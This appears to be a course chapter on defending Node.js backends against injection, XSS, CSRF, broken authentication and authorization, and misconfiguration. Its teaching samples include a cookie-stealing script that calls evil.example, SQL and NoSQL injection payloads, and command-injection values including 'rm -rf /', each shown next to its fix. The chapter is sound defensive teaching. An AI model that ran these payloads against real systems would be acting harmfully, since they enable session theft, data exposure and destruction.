---
title: Backend Security
description: Think like an attacker. SQL, NoSQL and command injection, password storage, cookie flags, JWT pitfalls, rate-limiting logins, broken authorization (BOLA and BFLA), XSS and CSP, CSRF, misconfigurations and leaked secrets, supply-chain risks, defence in depth, security testing, and lessons from real breaches, with tested Node.js examples.
author: Bitwise School
---

Security isn't a feature you add at the end. It's a habit you bring to every line of code. This chapter covers the attacks that most often break real backends: injection, broken authentication, broken authorization, XSS, CSRF and misconfiguration, with the mental models and code to prevent them.

Every demo in this chapter was actually run: the injection attacks, the sanitiser, the rate limiter and the security headers.

## Think like an attacker

> Attackers don't care what framework you use. They look for one thing: **where did the developer assume something?**

Almost every serious vulnerability comes from an assumption an attacker broke:

- "The input will be clean and well-formed."
- "The user is who they say they are."
- "Requests only come from our own frontend."
- "Nobody will open DevTools and change the request."

Under deadline pressure, you code the **happy path**. Attackers live on the unhappy paths: they change every parameter, replay every request and try every edge. The aim of this chapter is to make you usefully paranoid. Every time you write code, ask: *What am I assuming here? What happens if it's wrong?*

### The root cause of injection

Your backend talks to several systems, each with its own language: **SQL** to the database, **shell commands** to the operating system, **HTML and JavaScript** to the browser. Each language has special characters that separate *code* from *data*.

![User input flows through the backend into SQL, shell commands and HTML, where it can become SQL injection, command injection or XSS](/images/system-design/injection-boundaries.svg "SQL injection, command injection and XSS are the same bug in three different languages.")

**Injection** happens when user data crosses into one of those languages and gets interpreted as **code** instead of **data**. That one idea explains SQL injection, command injection and XSS.

## The attacks at a glance

| Attack | What goes wrong | Worst case |
| --- | --- | --- |
| **SQL injection** | user input becomes part of a SQL query | read every row, change data, sometimes run OS commands |
| **Command injection** | user input becomes part of a shell command | run any command on your server |
| **XSS** | user content is rendered as HTML/JS in other users' browsers | steal sessions, act as the user, phish |
| **Broken authentication** | weak password storage, guessable sessions, no rate limits | account takeover |
| **Broken authorization** (BOLA/BFLA) | logged-in users reach data or functions that aren't theirs | user A reads user B's invoices; students reach admin APIs |
| **CSRF** | another site makes the browser send authenticated requests | unwanted transfers or changes |
| **Misconfiguration** | secrets in git, debug output in production, missing headers | anything, depending on what leaked |

The **OWASP Top 10** is the industry's list of the most critical web risks. Broken access control has been at or near the top for years.

## SQL injection

SQL injection has been one of the most damaging vulnerabilities for decades. It happens when a query is built by **gluing user input into the SQL string**.

A login lookup built by concatenation:

```js
// VULNERABLE: never build SQL like this
const { rows } = await db.query(`SELECT id, email FROM users WHERE email = '${email}'`);
```

An attacker types `' OR '1'='1` as their email. The query becomes:

```sql
SELECT id, email FROM users WHERE email = '' OR '1'='1'
```

`'1'='1'` is always true, so the condition matches **every row**. In our test against a real Postgres table, the concatenated query returned all users, while the parameterized query with the same input returned none:

```text
concatenated query with  ' OR '1'='1  -> 2 rows (every user!)
parameterized query with the same input -> 0 rows
```

| Character | Meaning in SQL | How attackers use it |
| --- | --- | --- |
| `'` | ends a string | escapes from the data into the code |
| `;` | ends a statement | starts a second, malicious statement |
| `--` | comment | hides the rest of the original query |
| `OR` | logical or | makes a condition always true |
| `UNION` | combines result sets | pulls data from other tables (payments, secrets) |

Whether a second statement after `;` actually runs depends on the driver. node-postgres, for example, runs multiple statements when a query has no parameters. But as the test shows, `OR '1'='1'` alone is already enough to leak everything.

### The fix: parameterized queries

Send the database **two separate things**: the query with placeholders, and the values. The driver guarantees a value is only ever treated as data:

```js
// SAFE: the value travels next to the query, never inside it
const { rows } = await db.query("SELECT id, email FROM users WHERE email = $1", [email]);
```

Every mainstream ORM and query builder (Prisma, Drizzle, Sequelize, Knex, TypeORM, Mongoose) parameterizes by default. You only become vulnerable by building raw SQL strings yourself, often in "just this one quick report query". Don't. When you must insert identifiers like column names, take them from an **allow-list** ([Chapter 08](/system-design/08-databases/)).

### Limit the damage: least privilege for the database user

Your app's database user should have only the permissions it needs, usually reading and writing rows, never dropping tables or changing the schema. Run migrations with a separate, more powerful user.

```sql
CREATE ROLE app_user LOGIN PASSWORD '...';
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_user;
-- no CREATE, DROP or ALTER: an injection can't destroy the schema
```

### NoSQL injection (MongoDB)

MongoDB queries are objects, not strings, but they support operators like `$ne` (not equal), `$gt` and `$regex`. If you pass request data straight into a query, an attacker can send an **object** where you expected a string:

```js
// VULNERABLE: the attacker sends {"email": "asha@example.com", "password": {"$ne": ""}}
const user = await User.findOne({ email: req.body.email, password: req.body.password });
// password "not equal to empty string" matches, and they're logged in
```

Fixes: **validate types** so `password` must be a string ([Chapter 05](/system-design/05-validations-and-transformations/)), never compare passwords in a query (compare hashes in code, [Chapter 04](/system-design/04-authentication-and-authorization/)), and turn on Mongoose's `mongoose.set("sanitizeFilter", true)`, which neutralises `$` operators in query filters.

## Command injection

Command injection is SQL injection for the operating system. Backends sometimes run other programs: ffmpeg for video, ImageMagick for images, a PDF tool. Build the command as a string with user input, and an attacker can append their own commands.

We ran both versions with a "filename" of `notes.txt; echo INJECTED-COMMAND-RAN`:

```js
import { exec, execFile } from "node:child_process";

// VULNERABLE: exec runs the string through a shell, so ";" starts a new command
exec(`echo processing ${filename}`);
// → "processing notes.txt"  then  "INJECTED-COMMAND-RAN"   (the attacker's command ran)

// SAFE: execFile passes arguments directly to the program. No shell, so ";" is just a character.
execFile("echo", ["processing", filename]);
// → "processing notes.txt; echo INJECTED-COMMAND-RAN"
```

| Character | Shell meaning | Attack use |
| --- | --- | --- |
| `;` | run another command | `file.png; rm -rf /` |
| `&&` | run if the previous succeeded | chain an exploit |
| `\|` | pipe | send output to another program |
| `&` | run in the background | start something that keeps running |
| `$( )`, backticks | command substitution | run a command inside another |

The rule: **never pass user input into a string that a shell will interpret.** Use `execFile` or `spawn` with an argument array (and never `shell: true`), validate inputs such as file names against a strict pattern, and prefer libraries (like `sharp` for images) over shelling out at all.

## Passwords

How you store passwords decides whether a database breach is an embarrassment or a disaster for your users. People reuse passwords, so a leaked password often unlocks their email and bank accounts too.

1. **Plain text**: every password exposed instantly. Never.
2. **A fast hash (MD5, SHA-256)**: attackers use precomputed **rainbow tables** for common passwords and GPUs computing billions of hashes a second.
3. **A salted, slow password hash**: a unique random **salt** per password defeats rainbow tables, and a deliberately **slow** algorithm (**Argon2id**, or bcrypt with a cost of 12 or more) makes guessing take centuries. A 300 ms hash is unnoticeable at login and crippling for an attacker.

[Chapter 04](/system-design/04-authentication-and-authorization/) shows Argon2id with a pepper, and how to avoid timing leaks during login.

## Sessions and cookies

After login, you need to recognise the user on every request ([Chapter 04](/system-design/04-authentication-and-authorization/)): generate a long random session id with a cryptographically secure generator (`crypto.randomBytes(32)`), store the session server-side (Redis), and send the id in a cookie with all three flags:

| Flag | Effect | Without it |
| --- | --- | --- |
| `HttpOnly` | JavaScript can't read the cookie | one XSS bug steals every session through `document.cookie` |
| `Secure` | only sent over HTTPS | stolen on public Wi-Fi |
| `SameSite=Lax` or `Strict` | not sent on cross-site requests | CSRF from another site |

Prefer `HttpOnly` cookies over `localStorage` for session ids and tokens: any script running on your page, including one injected through XSS, can read `localStorage`.

## JWT pitfalls

JWTs are signed, not encrypted: anyone can read the payload ([Chapter 04](/system-design/04-authentication-and-authorization/)). Sessions are simpler and easier to revoke, so use JWTs only where statelessness is a real requirement. If you do:

- keep access tokens **short-lived** (5 to 15 minutes) with **rotating refresh tokens**,
- put nothing secret in the payload,
- use a long random signing secret (256 bits or more) or asymmetric keys, and rotate them,
- **pin the algorithm** when verifying (blocks `alg: none` and algorithm-confusion attacks),
- verify the signature, expiry, issuer and audience on every request.

## Rate-limit authentication endpoints

Without limits, an attacker can try thousands of passwords a minute (**brute force**), or test leaked email/password pairs from other breaches (**credential stuffing**). Rate limiting is **mandatory** on login, signup, password reset and OTP endpoints. Use layers:

1. **At the edge**: a CDN or WAF throttles abusive IPs before they reach you.
2. **Per IP**: cap requests from one address.
3. **Per account**: cap failed attempts against one email, whatever IP they come from.

```js
import { rateLimit, ipKeyGenerator } from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  limit: 5,                   // 5 attempts per window
  standardHeaders: "draft-8", // send the standard RateLimit header
  legacyHeaders: false,
  // Count per IP + account. ipKeyGenerator groups IPv6 addresses sensibly.
  keyGenerator: (req) => `${ipKeyGenerator(req.ip)}:${String(req.body?.email ?? "").toLowerCase()}`,
  message: { error: "Too many login attempts. Try again in 15 minutes." },
});

app.post("/auth/login", loginLimiter, loginHandler);
```

Seven quick attempts against one account returned `401 401 401 401 401 429 429`, while an attempt on a different account still got through. This in-memory store counts per server; with several servers, use a shared Redis store ([Chapter 09](/system-design/09-caching/)).

Be careful with hard **account lockouts** ("locked after 5 failures"): attackers can use them to lock real users out on purpose. Progressive delays, CAPTCHAs after a few failures, MFA and alerting on suspicious patterns are usually better.

## Broken authorization: BOLA and BFLA

> Authentication says who the user is. Authorization says what they may do. Most teams get authentication right and authorization wrong.

The core mistake: checking authorization only at the route ("is the user logged in?") and then assuming they may touch anything after that.

### BOLA: broken object-level authorization

Also called **IDOR** (insecure direct object reference). A user reads, changes or deletes **someone else's** object by changing an id:

```text
GET /api/invoices/1041   ← my invoice
GET /api/invoices/1042   ← someone else's, and the API happily returns it
```

The fix: **check ownership inside the query**, using the user id from the verified session, never from the request:

```js
export async function getInvoice(invoiceId, currentUserId) {
  const { rows } = await db.query(
    "SELECT id, amount, status FROM invoices WHERE id = $1 AND user_id = $2",
    [invoiceId, currentUserId]   // currentUserId comes from req.user, set by the auth middleware
  );
  if (rows.length === 0) throw NotFound("Invoice");   // 404, not 403: don't confirm it exists
  return rows[0];
}
```

Return **404, not 403**, for objects the user doesn't own: a 403 confirms the object exists and helps attackers map your data. Making `currentUserId` a required argument of repository methods turns the rule into structure: nobody can call it without the ownership filter.

### BFLA: broken function-level authorization

A regular user calls a **function** meant for admins, such as `DELETE /api/admin/users/42`, because the role check is missing. "Nobody knows the `/admin` URL" is **security through obscurity**, which isn't security at all: URLs show up in frontend bundles, logs and browser history.

The fix: role checks in middleware on every sensitive route, and **deny by default** ([Chapter 04](/system-design/04-authentication-and-authorization/)):

```js
const requireRole = (...roles) => (req, res, next) =>
  roles.includes(req.user?.role) ? next() : res.status(403).json({ error: "Forbidden" });

const admin = express.Router();
admin.use(requireAuth, requireRole("admin"));   // every route below is protected, none can forget
admin.delete("/users/:id", deleteUser);
app.use("/api/admin", admin);
```

| | BOLA (horizontal) | BFLA (vertical) |
| --- | --- | --- |
| What happens | user A reaches user B's data | a user reaches admin functions |
| Direction | sideways, across users | upwards, across privilege levels |
| Fix | ownership condition in every query | role checks on every sensitive route, deny by default |
| Respond with | 404 | 403 |

**Random ids help, but don't replace checks.** Sequential ids (`/invoices/1041`, `1042`…) invite enumeration. UUIDs are practically unguessable, so prefer them for anything exposed in URLs. But ids leak through links, logs and shared screenshots, so the ownership check is still what actually protects the data.

## Cross-site scripting (XSS)

**XSS** is injection into the **browser**: an attacker's JavaScript runs on your site, in another user's session. From there it can:

- read cookies that aren't `HttpOnly`, and everything in `localStorage`,
- call your API as the victim,
- show a fake login form or redirect to a phishing page,
- change what the page says.

| Type | How it works |
| --- | --- |
| **Stored** | malicious content is saved (a comment, a profile bio, a course review) and runs for **everyone** who views it: the most dangerous |
| **Reflected** | the script comes from the URL and is echoed back in the response, so the victim must click a crafted link |
| **DOM-based** | frontend code itself puts untrusted data into the page (`innerHTML`, `document.write`) |

### Prevention

1. **Escape output by default.** React, Vue and Angular escape values in templates automatically. The danger zones are the escape hatches: `dangerouslySetInnerHTML`, `v-html`, `innerHTML`.
2. **Sanitise rich text with an allow-list.** If users can post formatted text, allow only known-safe tags and attributes, using a maintained library. Never write your own sanitiser.
3. **Add a Content Security Policy** as a safety net.
4. **Keep session cookies `HttpOnly`**, so even a successful XSS can't steal the session.

```js
import sanitizeHtml from "sanitize-html";

const clean = sanitizeHtml(userComment, {
  allowedTags: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code", "pre"],
  allowedAttributes: { a: ["href"] },
  allowedSchemes: ["https", "mailto"],   // blocks javascript: links
});
```

Given this comment:

```html
<p>Great course! <b>Loved</b> it.</p><script>fetch('https://evil.example/?c='+document.cookie)</script>
<img src=x onerror="alert(1)"><a href="javascript:alert(1)">click</a><a href="https://bitwiseschool.com">site</a>
```

the sanitiser returned:

```html
<p>Great course! <b>Loved</b> it.</p><a>click</a><a href="https://bitwiseschool.com">site</a>
```

The `<script>`, the `<img onerror>` and the `javascript:` link are gone; the harmless formatting and the safe link survived. Sanitise when saving *and* render safely; DOMPurify does the same job in the browser.

### Content Security Policy

A **CSP** header tells the browser exactly where scripts, styles and images may come from. Even if an attacker injects a `<script>`, the browser refuses to run it unless it matches the policy. `helmet` sets a strict default (shown below). CSP is a last line of defence, not a substitute for escaping and sanitising.

## CSRF

**Cross-site request forgery** abuses the fact that browsers attach cookies automatically, even to requests started by another site. Modern defaults have mostly solved it: `SameSite=Lax` cookies (the browser default today), properly restricted CORS, and CSRF tokens for cookie-based forms. APIs that use `Authorization` header tokens aren't affected at all. [Chapter 04](/system-design/04-authentication-and-authorization/) covers the defences in code.

## Misconfigurations: holes we create ourselves

### Secrets in git

The most common catastrophic mistake: API keys, database passwords or signing secrets committed to a repository. Deleting the file in a new commit **doesn't help**, because the old value is still in the history. Bots scan public GitHub for keys within minutes of a push.

- Keep secrets in environment variables or a secret manager ([Chapter 14](/system-design/14-configuration-management/)); commit `.env.example`, never `.env`.
- Scan with **gitleaks** (as a pre-commit hook and in CI) and enable GitHub secret scanning.
- **If a secret is ever committed, rotate it immediately.** Assume it's compromised the moment it reached a remote.

### Verbose errors and debug logs in production

Debug logging and raw stack traces expose table names, query structure, file paths and library versions, which is a map for attackers, and often personal data too. Log at `info` in production, return generic error messages, and keep details in your logs ([Chapter 12](/system-design/12-error-handling-and-fault-tolerance/)).

### Other common ones

- CORS with `origin: "*"` (or reflecting any origin) together with credentials ([Chapter 01](/system-design/01-http-and-cors/)).
- Admin panels, Swagger UIs, database consoles or monitoring dashboards exposed to the internet without auth.
- Default credentials left on databases and dashboards.
- Directory listings, `.git` folders or `.env` files served by a misconfigured web server.
- Outdated dependencies with known vulnerabilities.

### Security headers

One middleware sets the standard security headers. These are the real headers `helmet()` produced in our test:

```text
content-security-policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';
                         frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';
                         script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
strict-transport-security: max-age=31536000; includeSubDomains
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
referrer-policy: no-referrer
cross-origin-opener-policy: same-origin
x-powered-by: (removed)
```

| Header | Protects against |
| --- | --- |
| `Content-Security-Policy` | XSS: limits where scripts can load from |
| `Strict-Transport-Security` | downgrade to HTTP and SSL stripping |
| `X-Content-Type-Options: nosniff` | MIME-sniffing attacks |
| `X-Frame-Options` / CSP `frame-ancestors` | clickjacking |
| `Referrer-Policy` | leaking URLs (and tokens in them) to other sites |
| removing `X-Powered-By` | advertising your framework to attackers |

## Supply-chain security

Your app is mostly other people's code: a typical Node project pulls in hundreds of packages. Attackers target that chain through vulnerable versions, hijacked maintainer accounts and look-alike package names (**typosquatting**).

- Commit your **lockfile** and install with `npm ci` in CI, so you get exactly the versions you tested.
- Run `npm audit` in CI and enable **Dependabot** or Renovate for automatic update pull requests.
- Before adding a package, check it's maintained, widely used and spelled correctly. Fewer dependencies means less risk.
- Patch critical vulnerabilities fast: within days, not months.

## Defence in depth

> No single defence is perfect. Stack them, so an attacker has to beat all of them at once.

![Nested security layers from the network edge through identity, authorization and input handling, surrounding the data and business logic](/images/system-design/defence-in-depth.svg "If one layer fails, the next one still stands.")

At every boundary in your code, ask three questions:

1. **Where is data crossing a boundary?** User → SQL, user → shell, user → HTML, service → service.
2. **What am I assuming about it?** That it's a string? A valid email? Owned by this user? From our frontend?
3. **What does an attacker gain if that assumption is wrong?**

Asking these consistently prevents the large majority of vulnerabilities that break real systems.

## Putting it together: a secure login endpoint

```js
import crypto from "node:crypto";
import { z } from "zod";

const LoginBody = z.object({
  email: z.string().trim().toLowerCase().pipe(z.email()),
  password: z.string().min(1).max(200),   // a string, never an object (no NoSQL tricks)
});

app.post("/auth/login", loginLimiter, validate({ body: LoginBody }), async (req, res, next) => {
  const { email, password } = req.valid.body;

  // Parameterized lookup + Argon2 verify that takes the same time whether or not the user exists (Chapter 04)
  const user = await checkLogin(email, password);
  if (!user) {
    req.log.warn({ email: crypto.createHash("sha256").update(email).digest("hex").slice(0, 12) }, "login failed");
    return res.status(401).json({ error: "Invalid email or password" });   // one generic message
  }

  req.session.regenerate((err) => {   // a fresh session id blocks session fixation
    if (err) return next(err);
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ id: user.id, name: user.name });
  });
});
// express-session is configured with cookie: { httpOnly: true, secure: true, sameSite: "lax" }
```

Validation rejects malformed input, the limiter stops brute force, the query is parameterized, verification takes constant time, the error message reveals nothing, the session id is fresh and random, and the cookie carries all three flags. The log line records a hash prefix, not the email itself.

## OAuth and OpenID Connect

When users sign in with Google or GitHub, you're relying on OAuth 2.0 and OpenID Connect ([Chapter 04](/system-design/04-authentication-and-authorization/) walks through the flow). The security rules that matter most:

- Use the **authorization code flow with PKCE**; the implicit and password grants are deprecated.
- Generate and **check `state`** on the callback to stop login CSRF.
- **Verify the ID token**: signature, issuer (`iss`), audience (`aud` must be your client id) and expiry.
- Register **exact redirect URIs**, with no wildcards or open redirects.
- Request the smallest **scopes** you need, and keep client secrets on the server.

## HTTPS and TLS

TLS encrypts traffic and proves the server's identity ([Chapter 01](/system-design/01-http-and-cors/)). A practical checklist:

- HTTPS everywhere, with **HSTS**; redirect HTTP to HTTPS.
- TLS 1.2 or newer (1.3 preferred); let your load balancer or platform choose modern ciphers.
- Automate certificates (Let's Encrypt, or your cloud's certificate manager) so they never expire by surprise.
- Encrypt internal hops too where possible: TLS to the database and Redis, mTLS between services ([Chapter 13](/system-design/13-grpc-and-inter-service-communication/)).
- Test your public endpoint with SSL Labs' server test.

## Test before attackers do

### The attacker's checklist, used on your own API

Professional testers (following guides like the OWASP Web Security Testing Guide) work through the same steps every time. Try them on your own API before each release:

1. **Map it**: list every endpoint, parameter and header. Check your frontend bundle and API docs; attackers will.
2. **Authentication**: can you skip login? Brute-force it? Reuse a logged-out token? Fixate a session?
3. **Authorization**: log in as user A and request user B's ids (BOLA). Call admin routes as a normal user (BFLA).
4. **Input**: send quotes, `$ne` objects, `;` and `&&`, `<script>`, huge payloads, negative numbers, wrong types.
5. **Business logic**: apply a coupon twice, buy with a negative quantity, skip a step in a multi-step flow, race two requests at once.
6. **Configuration**: check headers, CORS, error messages, exposed admin pages and debug endpoints.

### Tools

- **Burp Suite** (Community edition is free) and **OWASP ZAP** sit between your browser and the API, so you can inspect, modify and replay every request.
- **PortSwigger Web Security Academy** offers free, hands-on labs for every attack in this chapter. It's one of the best ways to learn this properly.

### Automate what you can in CI

| Check | Tool |
| --- | --- |
| known-vulnerable dependencies | `npm audit`, Dependabot, Snyk |
| leaked secrets | gitleaks, GitHub secret scanning |
| insecure code patterns (static analysis) | CodeQL, Semgrep, eslint-plugin-security |
| running app scan (dynamic analysis) | OWASP ZAP baseline scan |
| container images | Trivy, Docker Scout |

```yaml
# .github/workflows/security.yml: fail the build on high-severity dependency issues
name: security
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - run: npm audit --audit-level=high
```

## Lessons from real breaches

Every one of these traces back to a topic in this chapter.

### Equifax (2017): an unpatched framework

Attackers exploited a known flaw in **Apache Struts**, the Java framework behind one of Equifax's web applications: a crafted request header let them run commands on the server. A patch had been available for about two months. The breach exposed personal data of around **147 million people**, and settlements reached roughly $700 million. Weak network segmentation let the attackers move to other databases, and they went undetected for weeks.

**Lesson:** scan dependencies automatically and patch critical vulnerabilities within days. Segment networks so one compromised app can't reach everything.

### Uber (2022): hard-coded credentials

An attacker flooded a contractor with MFA push notifications until one was accepted (**MFA fatigue**). Inside the network, they found a script on a shared drive containing **hard-coded admin credentials** for Uber's privileged-access system, and from there reached internal tools, cloud consoles and source code.

**Lesson:** secrets belong in a secret manager, never in scripts or documents. Use phishing-resistant MFA (security keys, passkeys, number matching) for privileged access, and apply least privilege so one account can't reach everything.

### Facebook (2018): an authorization bug

A combination of bugs in the **"View As"** feature generated access tokens for the profile being viewed instead of the person viewing it. Attackers chained it to collect tokens at scale: Facebook reset around 50 million accounts and later said tokens for about 29 million users were stolen.

**Lesson:** authorization bugs are subtle and hard to spot manually. Check ownership at every data access, keep tokens short-lived and narrowly scoped, and write automated tests for authorization boundaries.

### LastPass (2022): a developer's home computer

Attackers compromised a senior DevOps engineer's **home computer** through a vulnerable media-server application installed on it, captured credentials, and used them to access cloud backups containing customers' encrypted password vaults and other data. Vaults protected by weak master passwords may be crackable offline.

**Lesson:** developer machines are part of your attack surface. Restrict production and backup access (just-in-time access, bastion hosts, hardware keys), manage work devices, and alert on unusual data access and exports.

Every breach starts with an assumption that turned out to be wrong: "that library is fine", "nobody will find that script", "the token is for the right user", "a home laptop is safe enough". Security is the discipline of noticing your assumptions.

## Quick revision

| Topic | One line |
| --- | --- |
| Mindset | find your assumptions; attackers live on unhappy paths |
| Injection | data crossing into SQL/shell/HTML as code; keep them separate |
| SQL injection | parameterized queries; allow-list identifiers; least-privilege DB user |
| NoSQL injection | validate types; `sanitizeFilter`; never query by password |
| Command injection | `execFile`/`spawn` with argument arrays; no shell |
| Passwords | salted, slow hashes: Argon2id or bcrypt (cost ≥ 12) |
| Cookies | `HttpOnly`, `Secure`, `SameSite`; not `localStorage` |
| JWT | short-lived, rotate refresh tokens, pin the algorithm |
| Rate limiting | edge + per IP + per account on all auth endpoints |
| BOLA / BFLA | ownership in every query (404) / role checks, deny by default (403) |
| XSS | escape output, sanitise rich text with an allow-list, CSP, HttpOnly |
| CSRF | SameSite cookies, strict CORS, tokens for cookie forms |
| Misconfiguration | no secrets in git, generic errors, helmet headers |
| Supply chain | lockfiles, `npm ci`, audit, Dependabot, patch fast |
| Testing | attacker's checklist, Burp/ZAP, automated scans in CI |

## Interview questions

1. What is the root cause shared by SQL injection, command injection and XSS?
2. Show how `' OR '1'='1` exploits a concatenated query. How do parameterized queries prevent it?
3. What is NoSQL injection in MongoDB? How do you prevent it?
4. How do you safely run an external program with user-supplied input in Node.js?
5. Why are salted, slow hashes required for passwords?
6. What do `HttpOnly`, `Secure` and `SameSite` protect against?
7. How would you protect a login endpoint from brute force and credential stuffing?
8. What are BOLA and BFLA? Why return 404 rather than 403 for someone else's object?
9. What are stored, reflected and DOM-based XSS? How do you prevent each?
10. What does a Content Security Policy do?
11. A teammate committed an API key to GitHub and deleted it in the next commit. Is that enough?
12. What is defence in depth? Give an example of layers in a web backend.
13. What security checks would you add to a CI pipeline?
14. Pick a well-known breach and explain which vulnerability caused it and how it could have been prevented.

## Further reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) and [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/) (BOLA and BFLA in depth)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) (free labs)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [Node.js security best practices](https://nodejs.org/en/learn/getting-started/security-best-practices)
- [helmet](https://helmetjs.github.io/), [sanitize-html](https://github.com/apostrophecms/sanitize-html), [express-rate-limit](https://express-rate-limit.mintlify.app/)

Next: [Chapter 18, Scaling and Performance, Part 1](/system-design/18-scaling-and-performance-part-1/).
